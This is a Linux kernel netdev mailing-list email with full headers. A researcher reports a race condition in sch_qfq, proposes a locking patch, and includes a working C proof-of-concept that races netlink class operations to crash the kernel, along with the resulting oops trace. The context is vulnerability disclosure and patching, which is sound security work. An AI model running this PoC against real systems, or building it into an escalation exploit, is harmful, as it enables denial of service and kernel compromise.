Return-Path: <netdev+bounces-202315-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [IPv6:2604:1380:45e3:2400::1])
	by mail.lfdr.de (Postfix) with ESMTPS id 80D9CAED2D0
	for <lists+netdev@lfdr.de>; Mon, 30 Jun 2025 05:11:49 +0200 (CEST)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sv.mirrors.kernel.org (Postfix) with ESMTPS id B1B3C3A8FE3
	for <lists+netdev@lfdr.de>; Mon, 30 Jun 2025 03:11:23 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 8DC611547F2;
	Mon, 30 Jun 2025 03:11:45 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="Va+0awr4"
X-Original-To: netdev@vger.kernel.org
Received: from mail-pl1-f181.google.com (mail-pl1-f181.google.com [209.85.214.181])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 732A628F1
	for <netdev@vger.kernel.org>; Mon, 30 Jun 2025 03:11:43 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.181
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1751253105; cv=none; b=nTaDkkRy6Tsg4e0geu6+TbJ70q+lEC2P+VG1bWiSrs7PqaOxinnxjMVq+UGV/NJ59hkJYwjBUHljTULK6BFMcrm9cL3sMZu/W3AH7mpgajikUAVYPP6eF1C2Q6FHM++4hrHzKkqF6T2GpY1FyL4GQ0XKEoNXXzKT1BnQfA5cz7c=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1751253105; c=relaxed/simple;
	bh=p0TMusxcHjO2KPozzG4auVYMazVtNHNF9F2Iu7dpreQ=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=a5Au1dzdpl4ZTqt97fP25Oww1kgPNmScjBJWIwsNUtcyOdAP2dN9tr3AstTHa2p2qpHVuIE7KgSbwbtu7wyam9p3FxJRcs1GPTHnCxemq0J3Fb12vEeyAE2DOYMEe4uoyDPcJc3mCFiIEf2jZt2LEpWmbEmuJ/1Y8Q0dMIwKgP0=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=Va+0awr4; arc=none smtp.client-ip=209.85.214.181
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Received: by mail-pl1-f181.google.com with SMTP id d9443c01a7336-23526264386so13792505ad.2
        for <netdev@vger.kernel.org>; Sun, 29 Jun 2025 20:11:43 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1751253103; x=1751857903; darn=vger.kernel.org;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:from:to
         :cc:subject:date:message-id:reply-to;
        bh=T+Dlt6jw58wjbq3Zf2UaDkNtno0M9hjjv8EKhpte42g=;
        b=Va+0awr4mhcsdGThhs4OJvoviqFYwFH2jfrpBLDlXEY5meRqO8Nk3o96NzEPzfs5vo
         moZlTfUbSA1wscO22sNOSVAMJQzjKzUB5WGqSHwbtl3uqm3785i7GW7Np/8ZYlTvKlgc
         mLoNekvn9TzaFehwaUD6oHdZjgDA4aQX9mSAsKPfl8fjgB01vYp30xoviImzRYYCTtSQ
         D2r807/h0VwRXIEQt9qUGupXiUZrYUZfuFNttbS06982m8V+lQDrPDA61zZLmX1dUcQh
         dPxNfHf1hJjyUgM73cdzNxKLUA7DnQfBWRc9FO5bjnZ+wecj2kazfCjyF6haIDc22rHR
         V0xQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1751253103; x=1751857903;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=T+Dlt6jw58wjbq3Zf2UaDkNtno0M9hjjv8EKhpte42g=;
        b=Ixsp+qgE59oSWVoXraksEKvBK+oo17uC+vpIpZDgViEyprP4KQKc7FpEO3ycLyfwnH
         h/JJ8TfBqKzETeqScU0DjQvRNNEVam/GEND+Y+qglIYFo+n9SIBK3Ds5r0lwLFGLBEai
         Gc0QBXSSPKuY7llw3DbbWNQMQD7m/+VcUIrwfCMWeGWLtUGQL2BRjRr0v2tWW5SDL0Iq
         U2ecGn6vPkbx+ziM3lwpu6U0UeDm2b+rQUhnzJmqJsQ5G7KHGuaBbEkJRHoZeplNJw5P
         3orwjWd4oW152IiGDGWZlEF4YdK8yLeVzXtVKeYBAeJV9i8u4QD8puX0uNdM5Gavof6o
         r1ZA==
X-Forwarded-Encrypted: i=1; AJvYcCWrDpm1fF0R57QEcX0JRDWJpibI0z3HxpR1LCDBH8ipKnjriqC9bEkoGEdzc1hHG5oGCdr+oxY=@vger.kernel.org
X-Gm-Message-State: AOJu0Yydc5tXM9wNbj0KtrerTqZVuntznqhFcnbnKfdf9C3bRkvOzv7i
	7NtEAkbnIgAX5e6Q3CxnFqOFlw1BOzEIg09MiSA+B33+hoWtNzWi7olNrSeLdENDUg==
X-Gm-Gg: ASbGnctRUwOY2su1Icn15nUHjMGPSDfA9ZRa51myxUV791G1l42JGBg4QzCq51t+xUV
	iPjdzfcfJWY1DMWE72VzXhGRC/gpDd34FYX824NIAn3EL8hmk/NjNgA5lEYg4o/EAl08OadNR98
	rQdcwKmUi99kamyhyJlU8ldIwOgd9X0C7bQM6ZDARpLUYRbChV16n3ckpNVwozD5qmLRoDeP7QI
	0WrW3VxMoBmmAwCYxx1xQw/37hLaTlvmrXSddmQt+p8MzezPov5GeHPRT2eZ7q0Gz3JwBttOPs4
	HUMfjUcnKfKRGYZM/DiZFF9k16Ga6T704pKneWmlJgU+7cl/SiSKVAETvX7TaOJkoF1Wn6RP
X-Google-Smtp-Source: AGHT+IF9EEqiWbErGKdBJBw1e7q6D4HKpeKYk0xTQq7Qjvb/3OzHPAuopK/rbK9/Pvdrv7IYrANJpQ==
X-Received: by 2002:a17:903:40cc:b0:235:eb71:a398 with SMTP id d9443c01a7336-23ac4888122mr170931035ad.53.1751253102667;
        Sun, 29 Jun 2025 20:11:42 -0700 (PDT)
Received: from xps (209-147-138-224.nat.asu.edu. [209.147.138.224])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-23acb39bfcesm72861085ad.135.2025.06.29.20.11.41
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 29 Jun 2025 20:11:42 -0700 (PDT)
Date: Sun, 29 Jun 2025 20:11:40 -0700
From: Xiang Mei <xmei5@asu.edu>
To: Jamal Hadi Salim <jhs@mojatatu.com>
Cc: security@kernel.org,
	Linux Kernel Network Developers <netdev@vger.kernel.org>,
	Cong Wang <xiyou.wangcong@gmail.com>
Subject: Re: sch_qfq: race conditon on qfq_aggregate (net/sched/sch_qfq.c)
Message-ID: <aGIAbGB1VAX-M8LQ@xps>
References: <CAPpSM+SKOj9U8g_QsGp8M45dtEwvX4B_xdd7C0mP9pYu1b4mzA@mail.gmail.com>
 <CAM0EoMn+UiSmpH=iBeevpUN5N8TW+2GSEmyk6vA2MWOKgsRjBA@mail.gmail.com>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <CAM0EoMn+UiSmpH=iBeevpUN5N8TW+2GSEmyk6vA2MWOKgsRjBA@mail.gmail.com>

On Sun, Jun 29, 2025 at 10:28:12AM -0400, Jamal Hadi Salim wrote:
> On Sun, Jun 29, 2025 at 3:13 AM Xiang Mei <xmei5@asu.edu> wrote:
> >
> > Linux Kernel Security Team,
> >
> > We are writing to bring to your attention a race condition vulnerability in net/sched/sch_qfq.c.
> >
> > In function qfq_delete_class, the line `qfq_destroy_class(sch, cl);` is outside the protection of ` sch_tree_lock`, so any operation on agg could lead to a race condition vulnerability. For example, we can get a UAF by racing it with qfq_change_agg in qfq_enqueue.
> >
> > We verified it on v6.6.94 and exploited it in kernelCTF cos-109-17800.519.32.
> > A temporal fix could be
> > ```c
> > @@ -558,10 +562,9 @@ static int qfq_delete_class(struct Qdisc *sch, unsigned long arg,
> >
> >  qdisc_purge_queue(cl->qdisc);
> >  qdisc_class_hash_remove(&q->clhash, &cl->common);
> > -
> > +        qfq_destroy_class(sch, cl);
> >  sch_tree_unlock(sch);
> >
> > -       qfq_destroy_class(sch, cl);
> >  return 0;
> >  }
> > ```
> >
> > But this only avoids the exploitation. There are other places to exploit the vulnerability with a General Protection (usually null-deref). We found two places that can crash the kernel:
> >
> > 1. When modifying an existing class in  qfq_change_class, the reads of cl->agg->weight or cl->agg->lmax could lead to GPs.
> > 2. Reads of agg content in qfq_dump_class could lead to GPs.
> >
> > These reads of the agg structure may require `RCU` or `lock` to protect.
> >
> > Looking forward to hearing from you and discussing the patching.
> >
> 
> 
> Please partake in the discussion to fix this, your other issue and
> others on the netdev list, start with this thread:
> https://lore.kernel.org/netdev/aF847kk6H+kr5kIV@pop-os.localdomain/

Thanks so much for your time and the helpful information.

Here is a potential patch to this vulnerability:

sch_lock was used to protect the read/write options of aggs. The 
lock may influence the performance of the scheduler, and RCU could also               
be a patch option.

```
From e64c4f5d662dc3f3c5dedf4b755a151d826d7f70 Mon Sep 17 00:00:00 2001
From: n132 <xmei5@asu.edu>
Date: Sun, 29 Jun 2025 16:26:43 -0700
Subject: [PATCH] net/sched: sch_qfq: Fix qfq_aggregate race condition

Apply sch_lock when reading or modifying agg data to prevent race conditions between class options and enqueue.
---
 net/sched/sch_qfq.c | 30 +++++++++++++++++++++---------
 1 file changed, 21 insertions(+), 9 deletions(-)

diff --git a/net/sched/sch_qfq.c b/net/sched/sch_qfq.c
index bf1282cb22eb..dc77ffc01bb3 100644
--- a/net/sched/sch_qfq.c
+++ b/net/sched/sch_qfq.c
@@ -412,7 +412,7 @@ static int qfq_change_class(struct Qdisc *sch, u32 classid, u32 parentid,
 	bool existing = false;
 	struct nlattr *tb[TCA_QFQ_MAX + 1];
 	struct qfq_aggregate *new_agg = NULL;
-	u32 weight, lmax, inv_w;
+	u32 weight, lmax, inv_w, old_weight, old_lmax;
 	int err;
 	int delta_w;
 
@@ -443,12 +443,16 @@ static int qfq_change_class(struct Qdisc *sch, u32 classid, u32 parentid,
 	inv_w = ONE_FP / weight;
 	weight = ONE_FP / inv_w;
 
-	if (cl != NULL &&
-	   lmax == cl->agg->lmax &&
-	   weight == cl->agg->class_weight)
-		return 0; /* nothing to change */
+	if(cl != NULL){
+		sch_tree_lock(sch);
+		old_weight = cl->agg->class_weight;
+		old_lmax   = cl->agg->lmax;
+		sch_tree_unlock(sch);
+		if (lmax == old_lmax && weight == old_weight)
+			return 0; /* nothing to change */
+	}
 
-	delta_w = weight - (cl ? cl->agg->class_weight : 0);
+	delta_w = weight - (cl ? old_weight : 0);
 
 	if (q->wsum + delta_w > QFQ_MAX_WSUM) {
 		NL_SET_ERR_MSG_FMT_MOD(extack,
@@ -555,10 +559,10 @@ static int qfq_delete_class(struct Qdisc *sch, unsigned long arg,
 
 	qdisc_purge_queue(cl->qdisc);
 	qdisc_class_hash_remove(&q->clhash, &cl->common);
+	qfq_destroy_class(sch, cl);
 
 	sch_tree_unlock(sch);
 
-	qfq_destroy_class(sch, cl);
 	return 0;
 }
 
@@ -625,6 +629,8 @@ static int qfq_dump_class(struct Qdisc *sch, unsigned long arg,
 {
 	struct qfq_class *cl = (struct qfq_class *)arg;
 	struct nlattr *nest;
+	u32 class_weight;
+	u32 lmax;
 
 	tcm->tcm_parent	= TC_H_ROOT;
 	tcm->tcm_handle	= cl->common.classid;
@@ -633,8 +639,12 @@ static int qfq_dump_class(struct Qdisc *sch, unsigned long arg,
 	nest = nla_nest_start_noflag(skb, TCA_OPTIONS);
 	if (nest == NULL)
 		goto nla_put_failure;
-	if (nla_put_u32(skb, TCA_QFQ_WEIGHT, cl->agg->class_weight) ||
-	   nla_put_u32(skb, TCA_QFQ_LMAX, cl->agg->lmax))
+	sch_tree_lock(sch);
+	class_weight = cl->agg->class_weight;
+	lmax         = cl->agg->lmax;
+	sch_tree_unlock(sch);
+	if (nla_put_u32(skb, TCA_QFQ_WEIGHT, class_weight) ||
+	   nla_put_u32(skb, TCA_QFQ_LMAX, lmax))
 		goto nla_put_failure;
 	return nla_nest_end(skb, nest);
 
@@ -651,8 +661,10 @@ static int qfq_dump_class_stats(struct Qdisc *sch, unsigned long arg,
 
 	memset(&xstats, 0, sizeof(xstats));
 
+	sch_tree_lock(sch);
 	xstats.weight = cl->agg->class_weight;
 	xstats.lmax = cl->agg->lmax;
+	sch_tree_unlock(sch);
 
 	if (gnet_stats_copy_basic(d, NULL, &cl->bstats, true) < 0 ||
 	   gnet_stats_copy_rate_est(d, &cl->rate_est) < 0 ||
-- 
2.43.0
```

Here is the PoC triggering the race condition for your reference:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_sched.h>
#include <linux/if_arp.h>
struct tf_msg {
    struct nlmsghdr nlh;
    struct tcmsg tcm;
#define TC_DATA_LEN 0x200
    char attrbuf[TC_DATA_LEN];
};
struct if_msg {
    struct nlmsghdr nlh;
    struct ifinfomsg ifi;
};
typedef unsigned int u32;
int nl, inet_sock_fd;
char *  msgQdiscCreate;
char *  tclass_0x20001_create;
char *  tclass_0x20002_create;
char *  tclass_0x20001_reset;

unsigned short add_rtattr (unsigned long rta_addr, unsigned short type, unsigned short len, char *data) {
    struct rtattr *rta = (struct rtattr *)rta_addr;
    rta->rta_type = type;
    rta->rta_len = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    return rta->rta_len;
}
int initNL(){
    struct if_msg if_up_msg = {
        {
            .nlmsg_len = 32,
            .nlmsg_type = RTM_NEWLINK,
            .nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
        },
        {
            .ifi_family = AF_UNSPEC,
            .ifi_type = ARPHRD_NETROM,
            .ifi_index = 1,
            .ifi_flags = IFF_UP,
            .ifi_change = 1,
        },
    };
    int nl_sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if_up_msg.ifi.ifi_index = if_nametoindex("lo");
    NLMsgSend(nl_sock_fd, (struct tf_msg *)(&if_up_msg));
    return nl_sock_fd;
}
void NLMsgSend (int sock, struct tf_msg *m) {
    struct {
        struct nlmsghdr nh;
        struct nlmsgerr ne;
    } ack;
    write(sock, m, m->nlh.nlmsg_len);
    read(sock , &ack, sizeof(ack));
}
/* Prepared Values*/
void init_loopbacksend (u32 prio) {
    struct sockaddr iaddr = { AF_INET };
    inet_sock_fd = socket(PF_INET, SOCK_DGRAM, 0);
    int res = setsockopt(inet_sock_fd, SOL_SOCKET, SO_PRIORITY, &prio, sizeof(prio));
    connect(inet_sock_fd, &iaddr, sizeof(iaddr));
}

/* Trafic control for netlink */
void init_tf_msg (struct tf_msg *m) {
    m->nlh.nlmsg_len    = NLMSG_LENGTH(sizeof(m->tcm));
    m->nlh.nlmsg_type   = 0;    // Default Value
    m->nlh.nlmsg_flags  = NLM_F_REQUEST | NLM_F_ACK; 
    m->nlh.nlmsg_seq    = 0;    // Default Value
    m->nlh.nlmsg_pid    = 0;    // Default Value

    // tcmsg
    m->tcm.tcm_family   = PF_UNSPEC;
    m->tcm.tcm_ifindex  = if_nametoindex("lo");
    m->tcm.tcm_handle   = 0;    // Default Value
    m->tcm.tcm_parent   = -1;   // Default Value for no parent
    m->tcm.tcm_info     = 0;    // Default Value
}

struct tf_msg * classGet(u32 classid){
    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
    init_tf_msg(m);
    m->nlh.nlmsg_type        = RTM_GETTCLASS;
    m->tcm.tcm_handle        = classid;
    return m;
}
struct tf_msg * qfqQdiscAdd(u32 handle, u32 parent) {
    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
    init_tf_msg(m);
    m->nlh.nlmsg_type    = RTM_NEWQDISC;     
    m->nlh.nlmsg_flags   |= NLM_F_CREATE;
    m->tcm.tcm_handle    = handle;
    m->tcm.tcm_parent    = parent;
    m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("qfq") + 1, "qfq"));
    return m;
}
struct tf_msg * qfqClassAdd(int type, u32 classid,u32 val){
    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
    init_tf_msg(m);
    m->nlh.nlmsg_type       = RTM_NEWTCLASS;
    m->tcm.tcm_parent       = 0;
    m->tcm.tcm_handle       = classid;
    m->nlh.nlmsg_flags      |= NLM_F_CREATE;
    m->nlh.nlmsg_len        += NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("qfq") + 1, "qfq"));
    
    struct rtattr *opts     = (struct rtattr *)((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len));
    opts->rta_type          = TCA_OPTIONS;
    opts->rta_len           = RTA_LENGTH(0);
    
    if(type == TCA_QFQ_LMAX)
        opts->rta_len += RTA_ALIGN(add_rtattr((size_t)opts + opts->rta_len, TCA_QFQ_LMAX, sizeof(val), (char *)&val));
    else if(type == TCA_QFQ_WEIGHT)
        opts->rta_len += RTA_ALIGN(add_rtattr((size_t)opts + opts->rta_len, TCA_QFQ_WEIGHT, sizeof(val), (char *)&val));
    m->nlh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
    return m;
}
void initContext(){
    msgQdiscCreate =        qfqQdiscAdd(0x20000,-1);
    tclass_0x20001_reset  = tclass_0x20001_create = qfqClassAdd(TCA_QFQ_LMAX,0x20001,0x200);
    tclass_0x20002_create = qfqClassAdd(TCA_QFQ_LMAX,0x20002,0x400);   
}
int main(){
    initContext();
    nl = initNL();
    NLMsgSend(nl,msgQdiscCreate);
    NLMsgSend(nl,tclass_0x20001_create);
    NLMsgSend(nl,tclass_0x20002_create);
    init_loopbacksend(0x20001);
    if(fork()){
        while(1){
            write(inet_sock_fd, "", 0x400-42); // upgrade
            NLMsgSend(nl,tclass_0x20001_reset);
        }
    }else{
        char * pay = classGet(0x20001);
        while(1)
            NLMsgSend(nl,pay);
    }
}

/*
[    1.078863] BUG: kernel NULL pointer dereference, address: 0000000000000028
[    1.079284] #PF: supervisor read access in kernel mode
[    1.079580] #PF: error_code(0x0000) - not-present page
[    1.079882] PGD 101e10067 P4D 101e10067 PUD 101e11067 PMD 0 
[    1.080211] Oops: 0000 [#1] PREEMPT SMP NOPTI
[    1.080466] CPU: 1 PID: 117 Comm: exploit Not tainted 6.6.94 #1
[    1.080873] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[    1.081426] RIP: 0010:qfq_dump_class+0x7f/0x120
[    1.081700] Code: 2b 95 ff 85 c0 0f 88 a3 00 00 00 4d 85 e4 0f 84 9a 00 00 00 48 8b 45 68 48 8d 4c 24 04 ba 04 00 00 00 48 89 df be 01 00 00 00 <8b> 40 28 89 44 24 04 e8 c5 2b 95 ff 85 c0 75 5b 48 8b 45 68 48 8d
[    1.082747] RSP: 0018:ffffc900004975b0 EFLAGS: 00010282
[    1.083050] RAX: 0000000000000000 RBX: ffff8881013e7100 RCX: ffffc900004975b4
[    1.083447] RDX: 0000000000000004 RSI: 0000000000000001 RDI: ffff8881013e7100
[    1.083846] RBP: ffff888100b90380 R08: 0000000000000014 R09: ffff88810177e030
[    1.084238] R10: 00000000000381a0 R11: ffff888101fd8000 R12: ffff88810177e02c
[    1.084645] R13: ffff88810177e000 R14: ffffffff82d662a0 R15: ffff888101fd8000
[    1.085072] FS:  00000000198fe3c0(0000) GS:ffff88811c500000(0000) knlGS:0000000000000000
[    1.085557] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    1.085888] CR2: 0000000000000028 CR3: 000000010168e000 CR4: 0000000000750ee0
[    1.086329] PKRU: 55555554
[    1.086491] Call Trace:
[    1.086645]  <TASK>
[    1.086777]  tc_fill_tclass+0x145/0x240
[    1.087008]  tclass_notify.constprop.0+0x6a/0xd0
[    1.087275]  tc_ctl_tclass+0x3bc/0x5a0
[    1.087496]  rtnetlink_rcv_msg+0x14e/0x3d0
[    1.087734]  ? kmem_cache_alloc_node+0x4b/0x520
[    1.088011]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
[    1.088281]  netlink_rcv_skb+0x57/0x100
[    1.088506]  netlink_unicast+0x247/0x390
[    1.088733]  netlink_sendmsg+0x250/0x4d0
[    1.088964]  sock_write_iter+0x199/0x1a0
[    1.089192]  vfs_write+0x393/0x440
[    1.089396]  ksys_write+0xb7/0xf0
[    1.089591]  do_syscall_64+0x5e/0x90
[    1.089801]  ? do_syscall_64+0x6a/0x90
[    1.090022]  ? netlink_rcv_skb+0x84/0x100
[    1.090254]  ? kmem_cache_free+0x1e/0x360
[    1.090484]  ? kmem_cache_free+0x1e/0x360
[    1.090713]  ? netlink_unicast+0x252/0x390
[    1.090953]  ? netlink_sendmsg+0x25d/0x4d0
[    1.091189]  ? sock_write_iter+0x199/0x1a0
[    1.091425]  ? vfs_write+0x393/0x440
[    1.091633]  ? exit_to_user_mode_prepare+0x1a/0x150
[    1.091915]  ? syscall_exit_to_user_mode+0x27/0x40
[    1.092190]  ? do_syscall_64+0x6a/0x90
[    1.092407]  ? exit_to_user_mode_prepare+0x1a/0x150
[    1.092686]  ? syscall_exit_to_user_mode+0x27/0x40
[    1.092962]  ? do_syscall_64+0x6a/0x90
[    1.093180]  ? do_syscall_64+0x6a/0x90
[    1.093397]  ? clear_bhb_loop+0x60/0xb0
[    1.093620]  ? clear_bhb_loop+0x60/0xb0
[    1.093842]  ? clear_bhb_loop+0x60/0xb0
[    1.094066]  ? clear_bhb_loop+0x60/0xb0
[    1.094287]  ? clear_bhb_loop+0x60/0xb0
[    1.094508]  entry_SYSCALL_64_after_hwframe+0x78/0xe2
*/
```

> 
> cheers,
> jamal
> 
> 
> > Thanks,
> > Xiang Mei

